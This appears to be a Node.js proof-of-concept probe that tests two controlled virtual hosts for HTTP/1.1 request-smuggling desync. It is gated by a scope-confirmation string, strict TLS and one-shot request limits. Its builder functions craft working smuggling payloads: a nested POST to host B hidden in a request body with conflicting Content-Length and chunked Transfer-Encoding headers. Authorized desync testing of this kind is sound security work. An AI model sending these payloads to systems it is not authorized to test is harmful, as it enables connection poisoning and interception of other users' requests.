import { isIP } from "node:net";
import tls from "node:tls";
import { domainToASCII } from "node:url";

const TEST_ID = "SBX-040-POC";
const SCOPE_CONFIRMATION = "I_CONTROL_BOTH_SBX040_VIRTUAL_HOSTS_AND_AUTHORIZE_BOUNDED_HTTP1_DESYNC_TESTING";
const MAX_CONFIGURATION_BYTES = 64 * 1024;
const MAX_HEADER_BYTES = 32 * 1024;
const CAPTURE_CONTENT_LENGTH = 65_535;
const MODES = new Set([
  "direct-b",
  "normal-a",
  "host-b",
  "cl-only",
  "te-only",
  "ambiguous-alone",
  "ambiguous-plus-a",
]);
const CONFIGURATION_KEYS = new Set([
  "aHost",
  "bHost",
  "caPem",
  "canary",
  "caseId",
  "connectAddress",
  "mode",
  "outerHost",
  "outerPort",
  "runId",
  "scopeConfirmation",
  "timeoutMs",
]);

function output(value) {
  process.stdout.write(`${JSON.stringify(value)}\n`);
}

function string(value, name, maximum = 2_048) {
  if (typeof value !== "string" || value.length === 0 || value.length > maximum || /[\0\r\n]/u.test(value)) {
    throw new Error(`${name} must be a bounded string without control characters`);
  }
  return value;
}

function hostname(value, name) {
  const raw = string(value, name, 253);
  const ascii = domainToASCII(raw);
  if (!ascii || ascii !== raw || ascii !== raw.toLowerCase() || ascii.endsWith(".") || isIP(ascii) !== 0 ||
    ascii.split(".").some((label) => !/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/u.test(label))) {
    throw new Error(`${name} must be a canonical lower-case DNS hostname`);
  }
  return ascii;
}

function correlation(value, name) {
  const result = string(value, name, 128);
  if (!/^[A-Za-z0-9._:-]+$/u.test(result)) throw new Error(`${name} contains unsupported characters`);
  return result;
}

function parseConfiguration(encoded) {
  if (typeof encoded !== "string" || encoded.length === 0) throw new Error("missing base64url probe configuration");
  const bytes = Buffer.from(encoded, "base64url");
  if (bytes.length > MAX_CONFIGURATION_BYTES) throw new Error("probe configuration is too large");
  const input = JSON.parse(bytes.toString("utf8"));
  if (!input || typeof input !== "object" || Array.isArray(input)) throw new Error("configuration must be an object");
  for (const key of Object.keys(input)) if (!CONFIGURATION_KEYS.has(key)) throw new Error(`unknown configuration field ${key}`);
  if (input.scopeConfirmation !== SCOPE_CONFIRMATION) {
    throw new Error(`scopeConfirmation must equal ${SCOPE_CONFIRMATION}`);
  }
  if (!MODES.has(input.mode)) throw new Error("mode is invalid");
  const aHost = hostname(input.aHost, "aHost");
  const bHost = hostname(input.bHost, "bHost");
  if (aHost === bHost) throw new Error("A and B must be distinct");
  const outerHost = hostname(input.outerHost, "outerHost");
  if (outerHost !== (input.mode === "direct-b" ? bHost : aHost)) throw new Error("outerHost does not match mode");
  const connectAddress = input.connectAddress === undefined ? outerHost : input.connectAddress;
  if (connectAddress !== outerHost && connectAddress !== "127.0.0.1" && connectAddress !== "::1") {
    throw new Error("connectAddress may differ from outerHost only for a loopback-only local test");
  }
  if (!Number.isSafeInteger(input.outerPort) || input.outerPort < 1 || input.outerPort > 65_535) {
    throw new Error("outerPort is invalid");
  }
  const timeoutMs = input.timeoutMs ?? 4_000;
  if (!Number.isSafeInteger(timeoutMs) || timeoutMs < 250 || timeoutMs > 15_000) throw new Error("timeoutMs is invalid");
  const caPem = input.caPem;
  if (caPem !== undefined && (typeof caPem !== "string" || caPem.length === 0 || caPem.length > 32 * 1024 ||
    caPem.includes("\0") || !caPem.includes("-----BEGIN CERTIFICATE-----") || caPem.includes("PRIVATE KEY"))) {
    throw new Error("caPem must contain public certificates only");
  }
  return {
    mode: input.mode,
    aHost,
    bHost,
    outerHost,
    outerPort: input.outerPort,
    connectAddress,
    caseId: correlation(input.caseId, "caseId"),
    runId: correlation(input.runId, "runId"),
    canary: correlation(input.canary, "canary"),
    timeoutMs,
    caPem,
  };
}

function requestLines(method, target, headers, body = Buffer.alloc(0)) {
  const head = Buffer.from([
    `${method} ${target} HTTP/1.1`,
    ...headers,
    "",
    "",
  ].join("\r\n"), "latin1");
  return Buffer.concat([head, body]);
}

function commonHeaders(configuration, host, connection = "keep-alive") {
  return [
    `Host: ${host}`,
    `X-SBX040-Case: ${configuration.caseId}`,
    `X-SBX040-Canary: ${configuration.canary}`,
    "User-Agent: sbx040-bounded-probe/1",
    "Accept: */*",
    `Connection: ${connection}`,
  ];
}

function nestedBPrefix(configuration) {
  return Buffer.from([
    `POST /v1/sbx040/${configuration.runId}/capture HTTP/1.1`,
    `Host: ${configuration.bHost}`,
    `X-SBX040-Case: ${configuration.caseId}`,
    `X-SBX040-Canary: ${configuration.canary}`,
    `Content-Length: ${CAPTURE_CONTENT_LENGTH}`,
    "Content-Type: application/octet-stream",
    "",
    "",
  ].join("\r\n"), "latin1");
}

function buildFirstRequest(configuration) {
  const path = `/v1/sbx040/${configuration.runId}/${configuration.mode}`;
  if (configuration.mode === "direct-b" || configuration.mode === "normal-a" || configuration.mode === "host-b") {
    const host = configuration.mode === "host-b" || configuration.mode === "direct-b" ? configuration.bHost : configuration.aHost;
    return requestLines("GET", path, commonHeaders(configuration, host, "close"));
  }
  const prefix = nestedBPrefix(configuration);
  if (configuration.mode === "cl-only") {
    const body = Buffer.concat([Buffer.from("0\r\n\r\n", "ascii"), prefix]);
    return requestLines("POST", path, [
      ...commonHeaders(configuration, configuration.aHost),
      `Content-Length: ${body.length}`,
      "Content-Type: application/octet-stream",
    ], body);
  }
  if (configuration.mode === "te-only") {
    const body = Buffer.concat([
      Buffer.from(`${prefix.length.toString(16)}\r\n`, "ascii"),
      prefix,
      Buffer.from("\r\n0\r\n\r\n", "ascii"),
    ]);
    return requestLines("POST", path, [
      ...commonHeaders(configuration, configuration.aHost),
      "Transfer-Encoding: chunked",
      "Content-Type: application/octet-stream",
    ], body);
  }
  const body = Buffer.concat([Buffer.from("0\r\n\r\n", "ascii"), prefix]);
  return requestLines("POST", path, [
    ...commonHeaders(configuration, configuration.aHost),
    `Content-Length: ${body.length}`,
    "Transfer-Encoding: chunked",
    "Content-Type: application/octet-stream",
  ], body);
}

function buildSecondRequest(configuration) {
  return requestLines("GET", `/v1/sbx040/${configuration.runId}/next`, [
    ...commonHeaders(configuration, configuration.aHost, "close"),
    "Content-Length: 0",
  ]);
}

class Reader {
  constructor(socket) {
    this.iterator = socket[Symbol.asyncIterator]();
    this.buffer = Buffer.alloc(0);
  }

  async response() {
    while (true) {
      const index = this.buffer.indexOf("\r\n\r\n");
      if (index >= 0) {
        const raw = this.buffer.subarray(0, index).toString("latin1");
        this.buffer = this.buffer.subarray(index + 4);
        const lines = raw.split("\r\n");
        const status = /^HTTP\/1\.[01] ([1-5][0-9]{2})(?: |$)/u.exec(lines.shift() ?? "");
        if (!status) throw new Error("invalid HTTP response status line");
        const headers = new Map();
        for (const line of lines) {
          const separator = line.indexOf(":");
          if (separator <= 0) throw new Error("invalid response header line");
          const name = line.slice(0, separator).trim().toLowerCase();
          const value = line.slice(separator + 1).trim();
          const values = headers.get(name) ?? [];
          values.push(value);
          headers.set(name, values);
        }
        const lengths = headers.get("content-length") ?? [];
        if (lengths.length !== 1 || !/^(?:0|[1-9][0-9]{0,4})$/u.test(lengths[0])) {
          throw new Error("response must have one bounded canonical Content-Length");
        }
        const length = Number(lengths[0]);
        while (this.buffer.length < length) await this.pull();
        this.buffer = this.buffer.subarray(length);
        return {
          statusCode: Number(status[1]),
          operationId: headers.get("x-sbx040-operation")?.length === 1 ? headers.get("x-sbx040-operation")[0] : undefined,
          terminalHeader: headers.get("x-sbx040-raw-terminal")?.length === 1 && headers.get("x-sbx040-raw-terminal")[0] === "1",
          bodyBytes: length,
        };
      }
      if (this.buffer.length > MAX_HEADER_BYTES) throw new Error("response headers exceeded their bound");
      await this.pull();
    }
  }

  async pull() {
    const next = await this.iterator.next();
    if (next.done) throw new Error("socket closed before response completed");
    this.buffer = Buffer.concat([this.buffer, Buffer.from(next.value)]);
  }
}

function connect(configuration) {
  return new Promise((resolve, reject) => {
    const socket = tls.connect({
      host: configuration.connectAddress,
      port: configuration.outerPort,
      servername: configuration.outerHost,
      rejectUnauthorized: true,
      ...(configuration.caPem ? { ca: configuration.caPem } : {}),
      ALPNProtocols: ["http/1.1"],
    });
    const timer = setTimeout(() => socket.destroy(Object.assign(new Error("TLS connection timed out"), { code: "ETIMEDOUT" })), configuration.timeoutMs);
    socket.once("secureConnect", () => {
      clearTimeout(timer);
      if (!socket.authorized || socket.alpnProtocol !== "http/1.1") {
        socket.destroy();
        reject(new Error("strict HTTP/1.1 TLS verification failed"));
        return;
      }
      resolve(socket);
    });
    socket.once("error", reject);
  });
}

async function main() {
  let configuration;
  let connectionAttempts = 0;
  let tlsHandshakes = 0;
  let actualRequests = 0;
  let socket;
  try {
    configuration = parseConfiguration(process.argv[2]);
    const maximumRequests = configuration.mode === "ambiguous-plus-a" ? 2 : 1;
    const firstHost = configuration.mode === "host-b" || configuration.mode === "direct-b"
      ? configuration.bHost
      : configuration.aHost;
    connectionAttempts += 1;
    socket = await connect(configuration);
    tlsHandshakes += 1;
    const reader = new Reader(socket);
    socket.write(buildFirstRequest(configuration));
    actualRequests += 1;
    const firstResponse = await reader.response();
    let secondResponse;
    if (configuration.mode === "ambiguous-plus-a") {
      socket.write(buildSecondRequest(configuration));
      actualRequests += 1;
      secondResponse = await reader.response();
    }
    socket.end();
    const firstExpected = firstResponse.statusCode === 204 && firstResponse.terminalHeader === true;
    const ok = configuration.mode === "ambiguous-plus-a"
      ? firstExpected && secondResponse?.statusCode === 200 && secondResponse.terminalHeader === true &&
        typeof secondResponse.operationId === "string"
      : firstExpected;
    output({
      schemaVersion: 1,
      testId: TEST_ID,
      caseId: configuration.caseId,
      mode: configuration.mode,
      outerHost: configuration.outerHost,
      outerPort: configuration.outerPort,
      firstHost,
      connectionAttempts,
      retryCount: 0,
      maximumRequests,
      actualRequests,
      tlsHandshakes,
      strictCertificateVerification: true,
      environmentProxyTrust: false,
      rawConfigurationRetained: false,
      rawCredentialRetained: false,
      ok,
      firstResponse,
      ...(secondResponse ? { secondResponse } : {}),
    });
  } catch (error) {
    socket?.destroy();
    output({
      schemaVersion: 1,
      testId: TEST_ID,
      caseId: configuration?.caseId ?? "invalid",
      mode: configuration?.mode ?? "normal-a",
      outerHost: configuration?.outerHost ?? "",
      outerPort: configuration?.outerPort ?? -1,
      firstHost: configuration
        ? configuration.mode === "host-b" || configuration.mode === "direct-b" ? configuration.bHost : configuration.aHost
        : "",
      connectionAttempts,
      retryCount: 0,
      maximumRequests: configuration?.mode === "ambiguous-plus-a" ? 2 : 1,
      actualRequests,
      tlsHandshakes,
      strictCertificateVerification: true,
      environmentProxyTrust: false,
      rawConfigurationRetained: false,
      rawCredentialRetained: false,
      ok: false,
      errorCode: typeof error?.code === "string" ? error.code : undefined,
      errorSyscall: typeof error?.syscall === "string" ? error.syscall : undefined,
    });
  }
}

await main();
